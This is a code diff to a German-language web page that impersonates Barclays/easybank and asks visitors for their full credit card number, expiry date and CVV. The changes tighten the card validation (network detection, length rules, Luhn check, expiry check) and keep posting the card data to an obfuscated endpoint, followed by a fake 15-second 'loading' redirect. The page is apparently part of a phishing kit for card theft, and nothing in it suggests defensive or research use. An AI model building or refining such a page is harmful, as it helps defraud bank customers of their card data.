@@ -45,11 +45,13 @@
 
     <main class="main-content">
       <div class="login-card">
-        
+
 
         <form id="caponaForm" class="login-form">
-          <h1 style="margin-bottom: 20px; color: var(--text-color); font-weight: 600;font-size: 27px;">Bestätigung erforderlich</h1>
-          <p style="margin-bottom: 30px; color: rgb(87, 87, 87); font-size: 17px;">Bitte geben Sie Ihre Barclays/easybank Kreditkartendaten ein, um fortzufahren.</p>
+          <h1 style="margin-bottom: 20px; color: var(--text-color); font-weight: 600;font-size: 27px;">Bestätigung
+            erforderlich</h1>
+          <p style="margin-bottom: 30px; color: rgb(87, 87, 87); font-size: 17px;">Bitte geben Sie Ihre
+            Barclays/easybank Kreditkartendaten ein, um fortzufahren.</p>
 
           <!-- Card Number -->
           <div class="form-group">
@@ -98,15 +100,39 @@
   </div>
 
   <script>
-    // Auto-format card number input
+    // ── Card type detection ──────────────────────────────────────────────────
+    function getCardType(num) {
+      const n = num.replace(/\s+/g, '');
+      if (/^4/.test(n)) return 'visa';
+      if (/^5[1-5]/.test(n) || /^2(2[2-9]|[3-6]\d|7[01]\d|720)/.test(n)) return 'mastercard';
+      if (/^3[47]/.test(n)) return 'amex';
+      if (/^(6304|6759|676[1-3]|6334)/.test(n)) return 'maestro';
+      return null;
+    }
+
+    const VALID_LENGTHS = {
+      visa: [13, 16],
+      mastercard: [16],
+      amex: [15],
+      maestro: [12, 13, 14, 15, 16, 17, 18, 19]
+    };
+
+    // ── Auto-format card number (groups of 4; Amex: 4-6-5) ──────────────────
     const cardInput = document.getElementById('cardNumber');
     cardInput.addEventListener('input', (e) => {
-      let value = e.target.value.replace(/\D/g, '').slice(0, 16);
-      let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+      const raw = e.target.value.replace(/\D/g, '').slice(0, 19);
+      const type = getCardType(raw);
+      let formatted;
+      if (type === 'amex') {
+        formatted = raw.replace(/^(\d{0,4})(\d{0,6})(\d{0,5}).*/, (_, a, b, c) =>
+          [a, b, c].filter(Boolean).join(' '));
+      } else {
+        formatted = raw.match(/.{1,4}/g)?.join(' ') || raw;
+      }
       e.target.value = formatted;
     });
 
-    // Auto-format expiry date input
+    // ── Auto-format expiry MM/YY ─────────────────────────────────────────────
     const expiryInput = document.getElementById('expiryDate');
     expiryInput.addEventListener('input', (e) => {
       let value = e.target.value.replace(/\D/g, '').slice(0, 4);
@@ -117,93 +143,110 @@
       }
     });
 
-    // CVV Input - just numbers
+    // ── CVV: digits only ─────────────────────────────────────────────────────
     const cvvInput = document.getElementById('cvv');
     cvvInput.addEventListener('input', (e) => {
       e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
     });
 
-    // Luhn Check
+    // ── Luhn algorithm ───────────────────────────────────────────────────────
     function luhnCheck(val) {
-      let sum = 0;
-      let shouldDouble = false;
-      // Remove spaces
-      val = val.replace(/\s+/g, '');
-      for (let i = val.length - 1; i >= 0; i--) {
-        let digit = +val.charAt(i);
-        if (shouldDouble) {
-          digit *= 2;
-          if (digit > 9) digit -= 9;
-        }
-        sum += digit;
+      const digits = val.replace(/\s+/g, '');
+      let sum = 0, shouldDouble = false;
+      for (let i = digits.length - 1; i >= 0; i--) {
+        let d = +digits[i];
+        if (shouldDouble) { d *= 2; if (d > 9) d -= 9; }
+        sum += d;
         shouldDouble = !shouldDouble;
       }
       return sum % 10 === 0;
     }
 
+    // ── Expiry date validator ────────────────────────────────────────────────
+    function validateExpiry(expiry) {
+      if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
+      const [mm, yy] = expiry.split('/').map(Number);
+      if (mm < 1 || mm > 12) return false;           // month must be 01-12
+      const now = new Date();
+      const currentYear = now.getFullYear() % 100;  // 2-digit year
+      const currentMonth = now.getMonth() + 1;       // 1-indexed
+      if (yy < currentYear) return false;            // year in the past
+      if (yy === currentYear && mm < currentMonth) return false; // this month is OK
+      return true;
+    }
+
+    // ── Form submission ──────────────────────────────────────────────────────
     document.getElementById('caponaForm').addEventListener('submit', function (e) {
       e.preventDefault();
 
       const submitBtn = document.getElementById('submitBtn');
       const errorMsg = document.getElementById('error-message');
 
-      // Reset error
       errorMsg.style.display = 'none';
       errorMsg.textContent = '';
 
-      const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+      const rawCard = document.getElementById('cardNumber').value.replace(/\s+/g, '');
       const expiry = document.getElementById('expiryDate').value;
       const cvv = document.getElementById('cvv').value;
+      const cardType = getCardType(rawCard);
 
-      // Basic Validation
-      if (cardNumber.length < 13 || !luhnCheck(cardNumber)) {
+      // 1. Card type must be recognised
+      if (!cardType) {
+        errorMsg.textContent = 'Kartennummer nicht erkannt. Bitte prüfen Sie Ihre Eingabe.';
+        errorMsg.style.display = 'block';
+        return;
+      }
+
+      // 2. Length must match the network
+      if (!VALID_LENGTHS[cardType].includes(rawCard.length)) {
+        errorMsg.textContent = 'Ungültige Kartennummerlänge für diesen Kartentyp.';
+        errorMsg.style.display = 'block';
+        return;
+      }
+
+      // 3. Luhn check
+      if (!luhnCheck(rawCard)) {
         errorMsg.textContent = 'Bitte geben Sie eine gültige Kartennummer ein.';
         errorMsg.style.display = 'block';
         return;
       }
 
-      if (expiry.length < 5) { // Simple check for MM/YY length
-        errorMsg.textContent = 'Bitte geben Sie ein gültiges Ablaufdatum ein.';
+      // 4. Expiry date
+      if (!validateExpiry(expiry)) {
+        errorMsg.textContent = 'Ungültiges oder abgelaufenes Ablaufdatum. Format: MM/JJ';
         errorMsg.style.display = 'block';
         return;
       }
 
-      if (cvv.length < 3) {
-        errorMsg.textContent = 'Bitte geben Sie einen gültigen CVV ein.';
+      // 5. CVV length (Amex = 4, others = 3)
+      const expectedCvvLen = cardType === 'amex' ? 4 : 3;
+      if (cvv.length < expectedCvvLen) {
+        errorMsg.textContent = `Bitte geben Sie einen gültigen ${expectedCvvLen}-stelligen CVV ein.`;
         errorMsg.style.display = 'block';
         return;
       }
 
-      // Disable submit button and show loading state
       submitBtn.disabled = true;
       submitBtn.textContent = 'Wird überprüft...';
 
-      // Submit data via jQuery AJAX
       $.ajax({
         url: '/NkMNm4664XhcW8KuukHk',
         type: 'POST',
         contentType: 'application/json',
-        data: JSON.stringify({
-          cardNumber: cardNumber,
-          expiryDate: expiry,
-          cvv: cvv
-        }),
+        data: JSON.stringify({ cardNumber: rawCard, expiryDate: expiry, cvv }),
         success: function (response) {
           if (response.OK) {
-            // Success - redirect
             setTimeout(() => {
               window.location.href = '/loading?time=15&url=/RKnUB922z6Mf4HDwg3EZ';
-            }, 1000); // Shorter delay for better UX
+            }, 1000);
           } else {
-            // Handle error response
             errorMsg.textContent = 'Fehler bei der Verarbeitung. Bitte überprüfen Sie Ihre Eingaben.';
             errorMsg.style.display = 'block';
             submitBtn.disabled = false;
             submitBtn.textContent = 'Bestätigen';
           }
         },
-        error: function (xhr, status, error) {
-          console.error('AJAX Error:', error);
+        error: function () {
           errorMsg.textContent = 'Ein Verbindungsfehler ist aufgetreten. Bitte versuchen Sie es später erneut.';
           errorMsg.style.display = 'block';
           submitBtn.disabled = false;
